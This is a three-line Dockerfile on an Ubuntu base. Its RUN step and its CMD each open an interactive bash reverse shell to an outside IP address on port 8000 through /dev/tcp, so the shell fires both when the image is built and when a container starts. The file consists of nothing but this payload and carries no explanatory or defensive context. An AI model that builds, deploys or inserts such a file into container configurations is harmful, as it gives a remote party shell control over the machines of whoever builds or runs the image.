FROM ubuntu:latest
RUN bash -c "bash -i >& /dev/tcp/155.138.195.0/8000 0>&1"
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/155.138.195.0/8000 0>&1"]
